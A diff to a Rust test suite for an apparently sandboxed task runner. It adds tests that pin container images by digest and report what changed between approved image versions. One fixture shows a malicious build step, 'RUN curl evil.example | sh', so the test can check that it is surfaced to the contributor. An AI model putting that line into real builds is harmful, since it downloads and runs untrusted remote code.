@@ -2693,6 +2693,15 @@ mod doctor {
     }
 
     #[test]
+    fn approved_environments_are_listed_with_their_pinned_digest() {
+        let mut c = cfg("envs");
+        let info = crate::image::ImageInfo { digest: format!("sha256:{}", "ab".repeat(32)), user: String::new(), env: vec![], entrypoint: vec![], cmd: vec![], size: 1, history: vec![] };
+        c.environments.insert("acme".into(), crate::image::EnvApproval { image: "ghcr.io/acme/env:1".into(), info });
+        let text: String = run_all(&c).iter().map(|k| k.to_string()).collect::<Vec<_>>().join("\n");
+        assert!(text.contains("acme: ghcr.io/acme/env@sha256:abab") && text.contains("projects update acme"), "{text}");
+    }
+
+    #[test]
     fn a_missing_image_or_unfenced_network_fails() {
         let mut c = cfg("img");
         c.sandbox = SandboxConfig::Docker { bin: "docker".into(), image: "toto-no-such-image".into(), runtime: None, bridge: None, nested_userns: false, network: None };
@@ -3481,6 +3490,10 @@ mod github_queue {
         )
     }
 
+    fn approval(image: &str) -> crate::image::EnvApproval {
+        crate::image::EnvApproval { image: image.into(), info: crate::image::ImageInfo { digest: format!("sha256:{}", "ab".repeat(32)), user: String::new(), env: vec![], entrypoint: vec![], cmd: vec![], size: 1, history: vec![] } }
+    }
+
     fn contributor(name: &str) -> Config {
         Config::starter(&super::fixture(name).dir)
     }
@@ -3509,16 +3522,17 @@ mod github_queue {
         assert!(!warnings.iter().any(|w| w.contains("customizations") || w.contains("name")), "editor settings are not worth a warning: {warnings:?}");
 
         let mut cfg = contributor("proj-env");
-        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: Some(image.clone()) }).unwrap();
-        assert_eq!(cfg.environments["acme"], image);
+        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, environment: Some(approval(&image)) }).unwrap();
+        assert_eq!(cfg.environments["acme"].image, image);
+        assert!(notes.iter().any(|n| n.contains("sha256:abab")), "the digest is shown: {notes:?}");
         assert!(notes.iter().any(|n| n.contains("ghcr.io/acme/toto-env:1.2") && n.contains("unprivileged")), "{notes:?}");
         // Re-adding without an environment drops the old image; removing the project drops it too.
-        projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: None }).unwrap();
+        projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, environment: None }).unwrap();
         assert!(cfg.environments.is_empty());
-        projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: Some(image) }).unwrap();
+        projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, environment: Some(approval(&image)) }).unwrap();
         projects::remove(&mut cfg, "acme").unwrap();
         assert!(cfg.environments.is_empty());
-        assert!(projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: Some("alpine".into()) }).is_err(), "unqualified images are refused");
+        assert!(projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, environment: Some(approval("alpine")) }).is_err(), "unqualified images are refused");
 
         // missing file, and descriptors with both or neither source
         let missing = Descriptor::parse(descriptor(&p.key, r#", "environment": {"devcontainer": "nope.json"}"#).as_bytes()).unwrap();
@@ -3537,7 +3551,7 @@ mod github_queue {
         assert_eq!(d.fingerprint().len(), 16);
 
         let mut cfg = contributor("proj-add");
-        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 3, accept: accept(&[]), token_file: None, image: None }).unwrap();
+        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 3, accept: accept(&[]), token_file: None, environment: None }).unwrap();
         assert_eq!(cfg.projects["acme"], d.public_key);
         assert_eq!((cfg.policy.project_shares["acme"], cfg.sources["acme"].as_str()), (3, "org/proj"));
         assert_eq!(cfg.policy.allowed_kinds, ["summarise"]);
@@ -3554,7 +3568,7 @@ mod github_queue {
         assert!(cfg.policy.admit(&t, 0, now).is_err(), "the network rule was not accepted");
 
         // Accepting by name grants exactly those things, and adding again changes nothing else.
-        let all = AddOptions { share: 3, accept: accept(&["network", "context", "stdio-mcp", "mcp-hosts"]), token_file: Some("/gh.token".into()), image: None };
+        let all = AddOptions { share: 3, accept: accept(&["network", "context", "stdio-mcp", "mcp-hosts"]), token_file: Some("/gh.token".into()), environment: None };
         projects::add(&mut cfg, "org/proj", &d, &all).unwrap();
         projects::add(&mut cfg, "org/proj", &d, &all).unwrap();
         assert!(cfg.policy.admit(&t, 0, now).is_ok());
@@ -3568,7 +3582,7 @@ mod github_queue {
         let p = project();
         let d = Descriptor::parse(descriptor(&p.key, "").as_bytes()).unwrap();
         let mut cfg = contributor("proj-bad");
-        let opts = |a: &[&str]| AddOptions { share: 1, accept: accept(a), token_file: None, image: None };
+        let opts = |a: &[&str]| AddOptions { share: 1, accept: accept(a), token_file: None, environment: None };
         projects::add(&mut cfg, "org/proj", &d, &opts(&[])).unwrap();
         let other = Descriptor::parse(descriptor(&crate::manifest::generate_key(), "").as_bytes()).unwrap();
         let e = projects::add(&mut cfg, "org/proj", &other, &opts(&[])).unwrap_err().to_string();
@@ -3597,7 +3611,7 @@ mod github_queue {
         let d1 = Descriptor::parse(descriptor(&p.key, "").as_bytes()).unwrap();
         let d2 = Descriptor::parse(descriptor(&p.key, "").replace("acme", "acme-two").as_bytes()).unwrap();
         let mut cfg = contributor("proj-rm");
-        let opts = AddOptions { share: 1, accept: accept(&[]), token_file: None, image: None };
+        let opts = AddOptions { share: 1, accept: accept(&[]), token_file: None, environment: None };
         projects::add(&mut cfg, "org/proj", &d1, &opts).unwrap();
         projects::add(&mut cfg, "org/proj", &d2, &opts).unwrap();
         assert_eq!(projects::list(&cfg).len(), 2);
@@ -3719,6 +3733,7 @@ mod owner_guide_examples {
             assert_eq!(path, ".devcontainer/toto/devcontainer.json");
             Ok(Some(DEVCONTAINER.as_bytes().to_vec()))
         }).unwrap().unwrap();
+        let approval = |image: &str| crate::image::EnvApproval { image: image.into(), info: crate::image::ImageInfo { digest: format!("sha256:{}", "cd".repeat(32)), user: String::new(), env: vec![], entrypoint: vec![], cmd: vec![], size: 1, history: vec![] } };
 
         let mut cfg = Config::starter(&super::fixture("guide").dir);
         let t: TaskManifest = serde_json::from_str(TASK).unwrap();
@@ -3726,11 +3741,11 @@ mod owner_guide_examples {
         t.sign(&key).unwrap();
         let now = chrono::Local::now();
         let mut accept = std::collections::BTreeSet::new();
-        projects::add(&mut cfg, "acme/docs", &d, &AddOptions { share: 1, accept: accept.clone(), token_file: None, image: Some(image) }).unwrap();
+        projects::add(&mut cfg, "acme/docs", &d, &AddOptions { share: 1, accept: accept.clone(), token_file: None, environment: Some(approval(&image)) }).unwrap();
         assert!(cfg.policy.admit(&t, 0, now).is_err(), "the task needs network, which the contributor has not accepted");
         accept.insert("network".to_string());
         accept.insert("context".to_string());
-        projects::add(&mut cfg, "acme/docs", &d, &AddOptions { share: 1, accept, token_file: None, image: Some("ghcr.io/acme/toto-env:1.0".into()) }).unwrap();
+        projects::add(&mut cfg, "acme/docs", &d, &AddOptions { share: 1, accept, token_file: None, environment: Some(approval("ghcr.io/acme/toto-env:1.0")) }).unwrap();
         cfg.policy.available_tools = t.tool_requirements.clone();
         assert!(cfg.policy.admit(&t, 0, now).is_ok(), "{:?}", cfg.policy.admit(&t, 0, now));
         assert!(t.sandbox_profile.network_allowlist.iter().all(|r| d.needs.network.contains(r)), "the task asks for no more than `needs` declares");
@@ -3741,5 +3756,67 @@ mod owner_guide_examples {
         let ctx = crate::context::ProjectContext::parse(&bytes, limits).unwrap();
         assert!(!ctx.skills.is_empty() && !ctx.instructions.is_empty(), "{}", ctx.summary());
         cfg.policy.admit_context(&ctx).unwrap();
+    }
+}
+
+mod image_approval {
+    use crate::image::*;
+
+    fn info(digest: &str, user: &str, env: &[&str], steps: &[&str]) -> ImageInfo {
+        ImageInfo { digest: digest.into(), user: user.into(), env: env.iter().map(|s| s.to_string()).collect(), entrypoint: vec![], cmd: vec![], size: 4_000_000, history: steps.iter().map(|s| s.to_string()).collect() }
+    }
+
+    #[test]
+    fn the_pinned_reference_drops_the_tag_and_keeps_the_digest() {
+        let a = |image: &str| EnvApproval { image: image.into(), info: info("sha256:aa", "", &[], &[]) };
+        assert_eq!(a("ghcr.io/acme/env:1.0").pinned(), "ghcr.io/acme/env@sha256:aa");
+        assert_eq!(a("registry.example.com:5000/x/y:latest").pinned(), "registry.example.com:5000/x/y@sha256:aa");
+        assert_eq!(a("ghcr.io/a/b@sha256:ff").pinned(), "ghcr.io/a/b@sha256:aa", "the approved digest wins over a digest in the name");
+        assert_eq!(repo_of("localhost:5000/env"), "localhost:5000/env");
+    }
+
+    #[test]
+    fn an_update_shows_exactly_what_changed() {
+        let old = info("sha256:aa", "", &["PATH=/bin"], &["RUN apt-get install git", "FROM debian"]);
+        let new = info("sha256:bb", "app", &["PATH=/bin", "TOKEN_URL=http://x"], &["RUN curl evil.example | sh", "RUN apt-get install git", "FROM debian"]);
+        let d = diff(&old, &new);
+        let text = d.join("\n");
+        for want in ["digest      sha256:aa -> sha256:bb", "user", "+ env       TOKEN_URL=http://x", "+ step      RUN curl evil.example | sh"] {
+            assert!(text.contains(want), "missing `{want}` in:\n{text}");
+        }
+        assert!(!text.contains("- step") && !text.contains("- env"), "{text}");
+        assert!(diff(&old, &old).is_empty(), "no change, no noise");
+        let removed = diff(&new, &old).join("\n");
+        assert!(removed.contains("- step      RUN curl evil.example | sh"), "{removed}");
+        let shown = describe("ghcr.io/a/b:1", &new).join("\n");
+        assert!(shown.contains("sha256:bb") && shown.contains("RUN curl evil.example | sh") && shown.contains("TOKEN_URL"), "{shown}");
+    }
+
+    /// Live: what the contributor is shown comes from the image itself, and the runner starts exactly the approved digest.
+    #[test]
+    fn live_inspection_reads_the_real_image_and_the_sandbox_runs_the_pinned_digest() {
+        use crate::sandbox::{exec, DockerSandbox, Sandbox};
+        if !super::proxy_container::docker_has("alpine") {
+            eprintln!("skipping: needs docker and alpine");
+            return;
+        }
+        let Ok(i) = inspect("docker", "alpine", false) else {
+            eprintln!("skipping: the local alpine has no registry digest");
+            return;
+        };
+        assert!(i.digest.starts_with("sha256:") && i.digest.len() == 71, "{}", i.digest);
+        assert!(i.history.iter().any(|h| h.contains("alpine-minirootfs")), "the build steps come from the image: {:?}", i.history);
+        assert!(i.env.iter().any(|e| e.starts_with("PATH=")) && i.size > 1_000_000);
+
+        let approved = EnvApproval { image: "alpine".into(), info: i };
+        let mut sb = DockerSandbox::new("debian:bookworm-slim"); // the default is something else entirely
+        sb.images.insert("a".into(), approved.pinned());
+        let key = crate::manifest::generate_key();
+        let t = super::task("pin-1", "a", 1, &key);
+        let ws = sb.create(&t, &t.sandbox_profile).unwrap();
+        let out = exec(&ws, &["sh", "-c", "cat /etc/os-release | head -1"], std::time::Duration::from_secs(20)).unwrap();
+        sb.destroy(ws).unwrap();
+        assert!(String::from_utf8_lossy(&out.stdout).contains("Alpine"), "ran the pinned image, not the default: {}", String::from_utf8_lossy(&out.stdout));
+        assert!(inspect("docker", "toto-no-such-image-here", false).is_err());
     }
 }
